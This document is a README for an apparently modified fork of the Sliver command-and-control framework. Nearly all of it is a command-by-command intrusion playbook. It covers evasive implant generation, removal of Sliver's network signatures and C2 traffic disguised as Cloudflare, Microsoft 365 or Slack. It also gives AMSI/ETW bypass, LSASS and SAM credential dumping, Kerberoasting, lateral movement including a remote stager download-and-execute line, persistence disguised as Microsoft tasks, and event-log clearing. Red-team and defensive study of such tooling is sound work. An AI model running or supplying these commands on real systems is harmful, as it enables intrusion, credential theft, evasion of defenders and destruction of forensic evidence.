# mgstate/sliver — Enhanced Adversary Emulation Framework

Enhanced fork of [BishopFox/sliver](https://github.com/BishopFox/sliver) with fixed SOCKS proxy, one-command RDP, reliable token impersonation, Harriet AV/EDR bypass integration, opsec C2 profiles, and network signature removal.

## What's New in This Fork

### New Commands
| Command | Description |
|---------|-------------|
| `rdp` | One-command RDP — auto port-forward + launches mstsc/xfreerdp |
| `steal-token PID` | Steal token by PID — resolves process owner automatically |
| `quick-impersonate` | Impersonate via creds (`-u/-p/-d`), PID (`-P`), or with exec (`-e`) |
| `harriet` | Generate AES-encrypted, code-signed payloads via Harriet loader |

### Fixed SOCKS Proxy (RDP/High-Bandwidth Works)
Upstream SOCKS proxy was unusable for RDP and high-bandwidth protocols:
- Removed 10ms sleep on every Read/Write/Close in implant tunnel handler
- Buffers: 4KB→64KB (client), 100→512 (channels)
- Rate limit: 10→50000 ops/s
- Inactivity timeout: 15s→120s (RDP idles for minutes)
- TCP keepalive + NoDelay on connections
- Non-blocking send prevents deadlock on saturated tunnels

### Fixed Token Impersonation
Upstream `impersonate` compared `proc.Owner()` (returns `"DOMAIN\username"`) with exact match — so `"admin"` never matched `"CORP\admin"`. Fixed with 3-tier matching: exact → case-insensitive → domain\user suffix.

### Network Signature Removal
Known Sliver network IOCs changed:
- Yamux magic bytes: `"MUX/1"` → `"HSK/2"`
- Envelope signing prefix: `"env-signing-v1:"` → `"tls-auth-seed:"`

### Opsec C2 Profiles
Pre-built HTTP traffic mimicry profiles in `opsec-profiles/`:
- **cloudflare** — CDN static asset fetches (CF-RAY, CF-Cache-Status headers)
- **microsoft365** — M365/Azure AD OAuth traffic (Edge UA, ESTS cookies)
- **slack** — Slack Web API calls (conversations.history, chat.postMessage)

### Harriet Integration
Built-in command wraps shellcode with [Harriet](https://github.com/assume-breach/Home-Grown-Red-Team/tree/main/Harriet) AES-encrypted loader using Harriet's native `EXE.sh`/`DLL.sh` build scripts. 5 execution methods: `directsyscall`, `queueapc`, `nativeapi`, `inject`, `aes`. EXE or DLL output.

---

## Quick Start

### Automated Setup (Kali/Ubuntu)
```bash
git clone https://github.com/mgstate/sliver.git ~/sliver
cd ~/sliver
bash setup.sh
```

This installs Go, MinGW, Harriet, builds Sliver, and creates helper scripts.

### Manual Build
```bash
# Prerequisites: Go 1.25+, MinGW (for Harriet)
sudo apt install -y mingw-w64 osslsigncode python3-pycryptodome
git clone https://github.com/mgstate/sliver.git ~/sliver
cd ~/sliver && make
```

### Start Server
```bash
./sliver-server
```

### Import C2 Profiles
```
sliver > c2profiles import -n cloudflare -f opsec-profiles/cloudflare-cdn-c2.json
sliver > c2profiles import -n microsoft365 -f opsec-profiles/microsoft365-c2.json
sliver > c2profiles import -n slack -f opsec-profiles/slack-api-c2.json
```

### Start Listeners
```
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > https --lhost 0.0.0.0 --lport 443 -d cdn.yourdomain.com
```

### Generate Implant
```
sliver > generate beacon \
  --mtls YOUR_IP:8888 \
  --http https://cdn.yourdomain.com \
  --os windows --arch amd64 \
  --format shellcode --evasion \
  --c2profile cloudflare \
  --seconds 60 --jitter 30 \
  --strategy r --save /tmp/beacon.bin
```

### Wrap with Harriet
```
sliver > harriet \
  --shellcode /tmp/beacon.bin \
  --method directsyscall \
  --format exe \
  --output /tmp/implant.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### Post-Exploitation
```
sliver (IMPLANT) > steal-token 1234              # Steal token by PID
sliver (IMPLANT) > quick-impersonate -u admin -p Pass -d CORP -e "whoami /all"
sliver (IMPLANT) > rdp -u admin -p Pass           # One-command RDP
sliver (IMPLANT) > socks5 start -p 1080           # SOCKS proxy (RDP works)
sliver (IMPLANT) > rev2self                        # Revert impersonation
```

---

## Post-Exploitation Playbook

### Armory Setup (One-Time Per Client)

Sliver's armory provides BOFs and .NET aliases that run in-process. Install by bundle for speed.

```
sliver > armory                                     # List everything available
sliver > armory update                              # Update installed packages

# ─── Install bundles (each installs multiple tools) ───
sliver > armory install windows-credentials          # nanodump, credman, mimikatz, handlekatz, chromiumkeydump, go-cookie-monster
sliver > armory install kerberos                     # bof-roast, nanorobeus, c2tc-kerberoast, tgtdelegation, delegationbof, kerbrute
sliver > armory install situational-awareness        # All 52+ sa-* BOFs (sa-whoami, sa-netstat, sa-ldapsearch, etc.)
sliver > armory install c2-tool-collection           # All 18 c2tc-* BOFs (c2tc-domaininfo, c2tc-lapsdump, etc.)
sliver > armory install cs-remote-ops-bofs           # All 35+ remote-* BOFs (remote-procdump, remote-sc-create, etc.)
sliver > armory install windows-pivot                # scshell, bof-servicemove, winrm, jump-wmiexec, jump-psexec
sliver > armory install windows-bypass               # inject-etw-bypass, inject-amsi-bypass, unhook-bof, patchit
sliver > armory install .net-recon                   # seatbelt, sharpup, sharpview, sharp-hound-4
sliver > armory install .net-execute                 # sharp-smbexec, sharp-wmi, sharpmapexec, sharprdp, nps
sliver > armory install .net-pivot                   # rubeus, certify, sharpsecdump, sharpdpapi, sharpchrome, sharplaps, krbrelayup, sqlrecon
```

### Evasion — Run First

```
# Bypass AMSI + ETW before running .NET assemblies
sliver (IMPLANT) > inject-amsi-bypass                # Patch AmsiScanBuffer
sliver (IMPLANT) > inject-etw-bypass                 # Patch EtwEventWrite
sliver (IMPLANT) > unhook-bof                        # Unhook ntdll from EDR
```

### Credential Dumping — LSA Secrets & SAM

**Requires:** High integrity (run implant as Administrator)

```
# ─── nanodump (LSASS dump, most evasive — BOF, in-process) ───
sliver (IMPLANT) > nanodump -- --write C:\Windows\Temp\debug.dmp --valid
# On Kali: pypykatz lsa minidump debug.dmp

# ─── handlekatz (LSASS via handle duplication — avoids direct open) ───
sliver (IMPLANT) > handlekatz

# ─── mimikatz (reflectively loaded — full mimikatz in-memory) ───
sliver (IMPLANT) > mimikatz sekurlsa::logonpasswords  # All plaintext/NTLM/Kerberos creds
sliver (IMPLANT) > mimikatz lsadump::sam              # SAM database
sliver (IMPLANT) > mimikatz lsadump::secrets          # LSA secrets (service account passwords)
sliver (IMPLANT) > mimikatz lsadump::cache            # Cached domain credentials (DCC2)
sliver (IMPLANT) > mimikatz lsadump::dcsync /user:DOMAIN\krbtgt  # DCSync (DA required)

# ─── credman (Credential Manager via token manipulation — BOF) ───
sliver (IMPLANT) > credman <target_user_pid>          # Dump saved Windows credentials

# ─── sharpsecdump (remote SAM/LSA/cached creds — .NET, no files on disk) ───
sliver (IMPLANT) > sharpsecdump -- -target=localhost
sliver (IMPLANT) > sharpsecdump -- -target=DC01       # Remote dump with admin access

# ─── sharpdpapi (DPAPI master keys + credential blobs) ───
sliver (IMPLANT) > sharpdpapi -- machinecredentials   # Machine DPAPI secrets
sliver (IMPLANT) > sharpdpapi -- triage               # All user DPAPI blobs

# ─── SAM + SECURITY + SYSTEM hive extraction (manual) ───
sliver (IMPLANT) > execute -o reg save HKLM\SAM C:\Windows\Temp\s
sliver (IMPLANT) > execute -o reg save HKLM\SECURITY C:\Windows\Temp\se
sliver (IMPLANT) > execute -o reg save HKLM\SYSTEM C:\Windows\Temp\sy
sliver (IMPLANT) > download C:\Windows\Temp\s
sliver (IMPLANT) > download C:\Windows\Temp\se
sliver (IMPLANT) > download C:\Windows\Temp\sy
# On Kali: secretsdump.py -sam s -security se -system sy LOCAL

# ─── hashdump (built-in Sliver — quick SAM hash dump) ───
sliver (IMPLANT) > hashdump

# ─── procdump (built-in Sliver — dump any process memory) ───
sliver (IMPLANT) > procdump -n lsass.exe -s /tmp/lsass.dmp
```

### LSA Whisperer — Credential Guard Bypass

[LSA Whisperer](https://github.com/dazzyddos/lsawhisper-bof) extracts credentials even with **Credential Guard enabled** by talking directly to LSA authentication packages via LSASS's public API. Integrated as a BOF armory extension — built and installed automatically by `setup.sh`.

```
# ─── Installed automatically by setup.sh (built from armory/lsa-whisperer/) ───
# Runs in-process via coff-loader — no file on disk, no upload needed

# ─── MSV1_0 module (DPAPI keys + NTLM — works WITH Credential Guard) ───
# These extract DPAPI credential keys that Credential Guard normally protects:
lsa-credkey                          # Current session DPAPI credential key
lsa-credkey 0x3e7                    # SYSTEM session DPAPI key (LUID)
lsa-strongcredkey                    # Strong DPAPI key (Win10+)
lsa-ntlmv1 0x3e7 1122334455667788   # NTLMv1 response for cracking

# ─── Kerberos module (ticket extraction) ───
lsa-klist                            # List cached Kerberos tickets
lsa-klist /all                       # All sessions (needs SYSTEM)
lsa-dump                             # Dump all tickets as base64 .kirbi
lsa-dump 0x3e7                       # Dump specific session tickets
lsa-purge                            # Purge tickets

# ─── CloudAP module (Azure AD / Entra ID — cloud SSO token theft) ───
lsa-ssocookie                        # Extract Entra ID PRT SSO cookie
lsa-devicessocookie                  # Device-bound SSO cookie
lsa-enterprisesso                    # AD FS enterprise SSO cookie
lsa-cloudinfo                        # Cloud provider info, TGT/DPAPI status
```

### Kerberoasting

**Requires:** Any domain user token

```
# ─── nanorobeus (BOF Rubeus — runs in-process, no .NET needed) ───
sliver (IMPLANT) > nanorobeus kerberoast /spn:MSSQLSvc/db01.corp.local:1433
sliver (IMPLANT) > nanorobeus klist                   # List cached tickets
sliver (IMPLANT) > nanorobeus klist /all              # All sessions
sliver (IMPLANT) > nanorobeus dump /all               # Dump all tickets as base64 kirbi
sliver (IMPLANT) > nanorobeus ptt /ticket:<base64>    # Pass-the-ticket
sliver (IMPLANT) > nanorobeus tgtdeleg /spn:cifs/dc01.corp.local  # TGT delegation trick

# ─── bof-roast (Kerberoast BOF) ───
sliver (IMPLANT) > bof-roast rdp/hostname.domain.local

# ─── c2tc-kerberoast (C2 Tool Collection BOF) ───
sliver (IMPLANT) > c2tc-kerberoast roast svc_sql

# ─── rubeus (.NET — full kerberos toolkit) ───
sliver (IMPLANT) > rubeus -- kerberoast /stats        # Find kerberoastable accounts
sliver (IMPLANT) > rubeus -- kerberoast /format:hashcat /nowrap  # All SPNs, hashcat format
sliver (IMPLANT) > rubeus -- kerberoast /user:svc_sql /nowrap    # Target specific account
sliver (IMPLANT) > rubeus -- asreproast /format:hashcat /nowrap  # AS-REP roast (no preauth)
# On Kali: hashcat -m 13100 hashes.txt rockyou.txt    # Kerberoast
# On Kali: hashcat -m 18200 asrep.txt rockyou.txt     # AS-REP roast
# Target RC4 (etype 23) accounts — much faster to crack than AES
```

### AD Enumeration

```
# ─── BloodHound collection (.NET, in-memory) ───
sliver (IMPLANT) > sharp-hound-4 -- -c All --zipfilename bh.zip --outputdirectory C:\Windows\Temp
sliver (IMPLANT) > download C:\Windows\Temp\bh.zip
# Import into BloodHound — find shortest path to DA

# ─── Situational awareness BOFs (fast, in-process, no .NET) ───
sliver (IMPLANT) > sa-whoami                          # Current user + groups + privs
sliver (IMPLANT) > sa-netlocalgroup Administrators    # Local admins
sliver (IMPLANT) > sa-netuser admin /domain           # Domain user details
sliver (IMPLANT) > sa-netgroup "Domain Admins" /domain  # DA members
sliver (IMPLANT) > sa-netloggedon                     # Who's logged on
sliver (IMPLANT) > sa-get-netsession                  # Network sessions
sliver (IMPLANT) > sa-netshares \\\\DC01              # Remote shares
sliver (IMPLANT) > sa-netview                         # Network computer discovery
sliver (IMPLANT) > sa-ldapsearch "(&(objectClass=user)(servicePrincipalName=*))"  # SPNs
sliver (IMPLANT) > sa-adcs-enum                       # AD Certificate Services
sliver (IMPLANT) > sa-get-password-policy              # Password policy
sliver (IMPLANT) > sa-driversigs                      # AV/EDR driver detection
sliver (IMPLANT) > sa-ipconfig                        # Network interfaces
sliver (IMPLANT) > sa-arp                             # ARP table
sliver (IMPLANT) > sa-netstat                         # Active connections
sliver (IMPLANT) > sa-sc-enum                         # Enumerate services
sliver (IMPLANT) > sa-schtasksenum                    # Enumerate scheduled tasks
sliver (IMPLANT) > sa-list_firewall_rules             # Firewall rules
sliver (IMPLANT) > sa-enum-filter-driver              # EDR filter drivers
sliver (IMPLANT) > sa-find-loaded-module              # Loaded DLLs (find EDR hooks)

# ─── C2 Tool Collection BOFs ───
sliver (IMPLANT) > c2tc-domaininfo                    # Domain info
sliver (IMPLANT) > c2tc-lapsdump                      # LAPS passwords
sliver (IMPLANT) > c2tc-psx                           # Extended process list
sliver (IMPLANT) > c2tc-smbinfo DC01                  # SMB info (OS version, domain)

# ─── .NET recon tools ───
sliver (IMPLANT) > seatbelt -- -group=all             # Full security audit
sliver (IMPLANT) > sharpup -- audit                   # Privesc vectors
sliver (IMPLANT) > sharpview -- 'Get-DomainUser -AdminCount'  # PowerView .NET port
sliver (IMPLANT) > certify -- find /vulnerable        # AD CS misconfigurations
sliver (IMPLANT) > sharplaps -- /host:DC01 /target:WS01  # LAPS password retrieval
```

### Lateral Movement

```
# ─── PsExec (built-in Sliver) ───
# First create a service profile:
sliver > profiles new --format service --skip-symbols --mtls C2_IP:8888 pivot-svc
sliver (IMPLANT) > psexec -p pivot-svc TARGET_HOSTNAME

# ─── jump-psexec (BOF — no .NET, creates service) ───
sliver (IMPLANT) > jump-psexec TARGET svcname /tmp/beacon.exe C:\Windows\Temp\svc.exe

# ─── jump-wmiexec (BOF — WMI execution) ───
sliver (IMPLANT) > jump-wmiexec TARGET 'powershell -ep bypass -c "IEX(curl http://C2/stager.ps1)"'

# ─── sharp-wmi (.NET WMI execution) ───
sliver (IMPLANT) > sharp-wmi -- action=exec computername=TARGET command="C:\Windows\Temp\beacon.exe"

# ─── sharp-smbexec (.NET SMB execution) ───
sliver (IMPLANT) > sharp-smbexec

# ─── sharpmapexec (.NET — multi-protocol like CrackMapExec) ───
sliver (IMPLANT) > sharpmapexec -- ntlm smb /target:192.168.1.0/24 /user:admin /ntlm:HASH /m:exec /a:"whoami"

# ─── winrm (BOF — WinRM execution) ───
sliver (IMPLANT) > winrm

# ─── scshell (service config lateral movement) ───
sliver (IMPLANT) > scshell

# ─── sharprdp (.NET — RDP command execution without GUI) ───
sliver (IMPLANT) > sharprdp

# ─── Token Impersonation + Lateral ───
sliver (IMPLANT) > steal-token 1234                   # Steal DA token
sliver (IMPLANT) > execute -o "dir \\\\DC01\\C$"      # Verify access
sliver (IMPLANT) > psexec -p pivot-svc DC01            # Move to DC

# ─── Pass-the-Hash / Over-Pass-the-Hash ───
sliver (IMPLANT) > rubeus -- asktgt /user:admin /rc4:NTLM_HASH /ptt
sliver (IMPLANT) > nanorobeus ptt /ticket:<base64>     # Inject ticket (BOF)
sliver (IMPLANT) > execute -o "dir \\\\DC01\\C$"       # Verify ticket works

# ─── RDP via SOCKS proxy ───
sliver (IMPLANT) > socks5 start -p 1080
# On Kali: proxychains xfreerdp /v:TARGET /u:admin /p:Pass /cert-ignore
# Or built-in:
sliver (IMPLANT) > rdp -u admin -p Pass --target TARGET_IP

# ─── SMB Named Pipe Pivot (routes through current session) ───
sliver > generate beacon --named-pipe PIPE_NAME --os windows --arch amd64 --save /tmp/pivot.bin
sliver (IMPLANT) > psexec -p pivot-svc TARGET          # New beacon pivots through you

# ─── Remote ops BOFs (operate on remote machines directly) ───
sliver (IMPLANT) > remote-sc-create TARGET svcname C:\Windows\Temp\beacon.exe
sliver (IMPLANT) > remote-sc-start TARGET svcname
sliver (IMPLANT) > remote-schtaskscreate TARGET taskname C:\Temp\beacon.exe
sliver (IMPLANT) > remote-schtasksrun TARGET taskname

# ─── Azure RunCommand (for Azure VMs — see AZURE-KILLCHAIN.md) ───
./deploy-runcommand.sh --token ARM_TOKEN --sub SUB --rg RG --vm VM --implant-url URL
```

### AD CS (Certificate) Attacks

```
sliver (IMPLANT) > certify -- find /vulnerable        # Find vulnerable templates
sliver (IMPLANT) > certify -- request /ca:CORP-CA /template:VulnTemplate /altname:administrator
# Use cert for authentication:
sliver (IMPLANT) > rubeus -- asktgt /user:administrator /certificate:cert.pfx /ptt
sliver (IMPLANT) > sa-adcs-enum                       # BOF enumeration alternative
```

### Kerberos Relay & Delegation Attacks

```
sliver (IMPLANT) > krbrelayup                          # Kerberos relay privesc
sliver (IMPLANT) > delegationbof 6 dc.domain.local     # Delegation abuse
sliver (IMPLANT) > tgtdelegation                       # TGT extraction via delegation
```

### Browser & Application Credential Theft

```
sliver (IMPLANT) > chromiumkeydump                     # Chrome/Edge encryption key
sliver (IMPLANT) > sharpchrome                         # Chrome passwords + cookies
sliver (IMPLANT) > go-cookie-monster                   # Chrome cookies (App-Bound Key)
```

### Persistence

```
# ─── Scheduled Task ───
sliver (IMPLANT) > execute -o schtasks /create /tn "Microsoft\Windows\NetTrace\DiagCheck" /tr "C:\ProgramData\Microsoft\Network\svchost.exe" /sc onstart /ru SYSTEM /f

# ─── Registry Run Key ───
sliver (IMPLANT) > execute -o reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /t REG_SZ /d "C:\ProgramData\Microsoft\Network\svchost.exe" /f

# ─── SharPersist (.NET — multiple persistence methods) ───
sliver (IMPLANT) > sharpersist -- -t schtask -c "C:\ProgramData\Microsoft\Network\svchost.exe" -n "DiagCheck" -m add -o logon
sliver (IMPLANT) > sharpersist -- -t reg -c "C:\ProgramData\Microsoft\Network\svchost.exe" -k "hklmrun" -v "DiagTrack" -m add
sliver (IMPLANT) > sharpersist -- -t service -c "C:\ProgramData\Microsoft\Network\svchost.exe" -n "DiagSvc" -m add

# ─── Remote persistence via BOF ───
sliver (IMPLANT) > remote-schtaskscreate TARGET DiagCheck "C:\Temp\beacon.exe"
sliver (IMPLANT) > remote-sc-create TARGET DiagSvc "C:\Temp\beacon.exe"
```

### Cleanup

```
sliver (IMPLANT) > rev2self
sliver (IMPLANT) > execute -o schtasks /delete /tn "Microsoft\Windows\NetTrace\DiagCheck" /f
sliver (IMPLANT) > execute -o reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /f
sliver (IMPLANT) > rm C:\ProgramData\Microsoft\Network\svchost.exe
sliver (IMPLANT) > rm C:\Windows\Temp\*.dmp
sliver (IMPLANT) > execute -o "wevtutil cl Security"
sliver (IMPLANT) > execute -o "wevtutil cl System"
sliver (IMPLANT) > execute -o "wevtutil cl Microsoft-Windows-PowerShell/Operational"
sliver (IMPLANT) > exit
```

### Kali Tool Setup

```bash
mkdir -p /opt/tools

# LSA Whisperer (Credential Guard bypass — SpecterOps)
git clone https://github.com/EvanMcBroom/lsa-whisperer.git /opt/tools/lsa-whisperer

# Impacket (secretsdump, psexec, wmiexec, dcomexec, smbexec)
pip3 install impacket

# pypykatz (parse LSASS dumps offline)
pip3 install pypykatz

# BloodHound (graph-based AD analysis)
pip3 install bloodhound
# Or: apt install bloodhound

# CrackMapExec / NetExec (network-wide credential testing)
pip3 install netexec
```

### Armory Quick Reference

| Bundle | Key Tools |
|--------|-----------|
| `windows-credentials` | nanodump, credman, mimikatz, handlekatz, chromiumkeydump, go-cookie-monster |
| `kerberos` | nanorobeus, bof-roast, c2tc-kerberoast, tgtdelegation, delegationbof, kerbrute |
| `situational-awareness` | 52+ sa-* BOFs (whoami, netstat, ldapsearch, adcs-enum, driversigs, etc.) |
| `c2-tool-collection` | 18 c2tc-* BOFs (domaininfo, lapsdump, kerberoast, petitpotam, wdtoggle, etc.) |
| `cs-remote-ops-bofs` | 35+ remote-* BOFs (remote-procdump, remote-sc-create, remote-reg-save, etc.) |
| `windows-pivot` | jump-psexec, jump-wmiexec, winrm, scshell, bof-servicemove |
| `windows-bypass` | inject-etw-bypass, inject-amsi-bypass, unhook-bof, patchit |
| `.net-recon` | seatbelt, sharpup, sharpview, sharp-hound-4 |
| `.net-execute` | sharp-smbexec, sharp-wmi, sharpmapexec, sharprdp, nps, sharpsh |
| `.net-pivot` | rubeus, certify, sharpsecdump, sharpdpapi, sharpchrome, sharplaps, krbrelayup, sqlrecon |

**Syntax note:** When running aliases with flags starting with `-`, use `--` separator:
```
# WRONG:  seatbelt -group=all
# RIGHT:  seatbelt -- -group=all
```

---

## Documentation

| Guide | Description |
|-------|-------------|
| [OPSEC-GUIDE.md](OPSEC-GUIDE.md) | Full step-by-step: build, profiles, listeners, implant generation, Harriet wrapping, deployment, post-exploitation, cleanup |
| [AZURE-KILLCHAIN.md](AZURE-KILLCHAIN.md) | Azure RunCommand lateral movement kill chain — proven engagement guide with Meatball C2 + Sliver C2 |
| [ATTACKPATH.md](ATTACKPATH.md) | Proven attack path: RunCommand initial access, BOF recon, LSA Whisperer, Kerberoast, lateral movement, DC takeover |

## Helper Scripts

| Script | Description |
|--------|-------------|
| `setup.sh` | Automated setup — installs deps, builds Sliver, sets up Harriet |
| `start.sh` | Generated by setup — launches server with profile import hints |
| `gen-implant.sh` | Generated by setup — one-command beacon + Harriet wrapping |
| `deploy-runcommand.sh` | Generated by setup — deploys implant to Azure VM via RunCommand v2 |

---

## Files Changed From Upstream

```
client/command/harriet/               # NEW — Harriet integration
client/command/rdp/                   # NEW — One-command RDP
client/command/privilege/steal-token.go    # REWRITTEN — PID-based token theft
client/command/privilege/quick-impersonate.go  # NEW — Enhanced impersonation
client/core/socks.go                  # FIXED — 64KB buffer, 50k rate limit
implant/sliver/handlers/tunnel_handlers/socks_handler.go  # FIXED — Sleep removal
implant/sliver/priv/priv_windows.go   # FIXED — 3-tier impersonation matching
implant/sliver/transports/mtls/mtls.go  # CHANGED — Network signatures
server/c2/mtls.go                     # CHANGED — Matching server signatures
server/rpc/rpc-socks.go              # TUNED — Buffer/timeout for high-bandwidth
opsec-profiles/                       # NEW — 3 C2 traffic profiles
setup.sh                              # NEW — Automated setup script
```

---

## Upstream

Based on [BishopFox/sliver](https://github.com/BishopFox/sliver) — open source adversary emulation framework. C2 over mTLS, WireGuard, HTTP(S), and DNS. Dynamic code generation, compile-time obfuscation, in-memory .NET assembly execution, COFF/BOF loader, TCP/named pipe pivots.

See the upstream [wiki](https://sliver.sh/) for base Sliver documentation.

### License — GPLv3

Sliver is licensed under [GPLv3](https://www.gnu.org/licenses/gpl-3.0.en.html). Some sub-components may have separate licenses.
